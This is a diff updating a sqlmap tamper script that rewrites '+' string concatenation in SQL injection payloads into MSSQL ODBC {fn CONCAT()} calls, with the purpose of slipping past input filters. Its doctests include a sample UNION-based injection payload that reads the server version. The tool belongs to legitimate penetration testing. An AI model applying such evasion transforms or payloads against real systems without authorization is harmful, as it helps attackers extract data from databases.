@@ -1,23 +1,27 @@
 #!/usr/bin/env python
 
 """
-Copyright (c) 2006-2017 sqlmap developers (http://sqlmap.org/)
+Copyright (c) 2006-2022 sqlmap developers (https://sqlmap.org/)
 See the file 'LICENSE' for copying permission
 """
 
+import os
 import re
 
+from lib.core.common import singleTimeWarnMessage
 from lib.core.common import zeroDepthSearch
+from lib.core.compat import xrange
+from lib.core.enums import DBMS
 from lib.core.enums import PRIORITY
 
 __priority__ = PRIORITY.HIGHEST
 
 def dependencies():
-    pass
+    singleTimeWarnMessage("tamper script '%s' is only meant to be run against %s" % (os.path.basename(__file__).split(".")[0], DBMS.MSSQL))
 
 def tamper(payload, **kwargs):
     """
-    Replaces plus ('+') character with ODBC function {fn CONCAT()}
+    Replaces plus operator ('+') with (MsSQL) ODBC function {fn CONCAT()} counterpart
 
     Tested against:
         * Microsoft SQL Server 2008
@@ -32,58 +36,29 @@ def tamper(payload, **kwargs):
     >>> tamper('SELECT CHAR(113)+CHAR(114)+CHAR(115) FROM DUAL')
     'SELECT {fn CONCAT({fn CONCAT(CHAR(113),CHAR(114))},CHAR(115))} FROM DUAL'
 
-    >>> tamper('SELECT (CHAR(113)+CHAR(114)+CHAR(115)) FROM DUAL')
-    'SELECT {fn CONCAT({fn CONCAT(CHAR(113),CHAR(114))},CHAR(115))} FROM DUAL'
+    >>> tamper('1 UNION ALL SELECT NULL,NULL,CHAR(113)+CHAR(118)+CHAR(112)+CHAR(112)+CHAR(113)+ISNULL(CAST(@@VERSION AS NVARCHAR(4000)),CHAR(32))+CHAR(113)+CHAR(112)+CHAR(107)+CHAR(112)+CHAR(113)-- qtfe')
+    '1 UNION ALL SELECT NULL,NULL,{fn CONCAT({fn CONCAT({fn CONCAT({fn CONCAT({fn CONCAT({fn CONCAT({fn CONCAT({fn CONCAT({fn CONCAT({fn CONCAT(CHAR(113),CHAR(118))},CHAR(112))},CHAR(112))},CHAR(113))},ISNULL(CAST(@@VERSION AS NVARCHAR(4000)),CHAR(32)))},CHAR(113))},CHAR(112))},CHAR(107))},CHAR(112))},CHAR(113))}-- qtfe'
     """
 
     retVal = payload
 
     if payload:
-        while True:
-            indexes = zeroDepthSearch(retVal, '+')
+        match = re.search(r"('[^']+'|CHAR\(\d+\))\+.*(?<=\+)('[^']+'|CHAR\(\d+\))", retVal)
+        if match:
+            old = match.group(0)
+            parts = []
+            last = 0
 
-            if indexes:
-                first, last = 0, 0
-                for i in xrange(1, len(indexes)):
-                    if ' ' in retVal[indexes[0]:indexes[i]]:
-                        break
-                    else:
-                        last = i
+            for index in zeroDepthSearch(old, '+'):
+                parts.append(old[last:index].strip('+'))
+                last = index
 
-                start = retVal[:indexes[first]].rfind(' ') + 1
-                end = (retVal[indexes[last] + 1:].find(' ') + indexes[last] + 1) if ' ' in retVal[indexes[last] + 1:] else len(retVal) - 1
+            parts.append(old[last:].strip('+'))
+            replacement = parts[0]
 
-                count = 0
-                chars = [char for char in retVal]
-                for index in indexes[first:last + 1]:
-                    if count == 0:
-                        chars[index] = ','
-                    else:
-                        chars[index] = '\x01'
-                    count += 1
+            for i in xrange(1, len(parts)):
+                replacement = "{fn CONCAT(%s,%s)}" % (replacement, parts[i])
 
-                retVal = "%s%s%s)}%s" % (retVal[:start], "{fn CONCAT(" * count, ''.join(chars)[start:end].replace('\x01', ")},"), retVal[end:])
-            else:
-                match = re.search(r"\((CHAR\(\d+.+CHAR\(\d+\))\)", retVal)
-                if match:
-                    part = match.group(0)
-                    indexes = set(zeroDepthSearch(match.group(1), '+'))
-                    if not indexes:
-                        break
-
-                    count = 0
-                    chars = [char for char in part]
-                    for i in xrange(1, len(chars)):
-                        if i - 1 in indexes:
-                            if count == 0:
-                                chars[i] = ','
-                            else:
-                                chars[i] = '\x01'
-                            count += 1
-
-                    replacement = "%s%s}" % (("{fn CONCAT(" * count)[:-1], "".join(chars).replace('\x01', ")},"))
-                    retVal = retVal.replace(part, replacement)
-                else:
-                    break
+            retVal = retVal.replace(old, replacement)
 
     return retVal
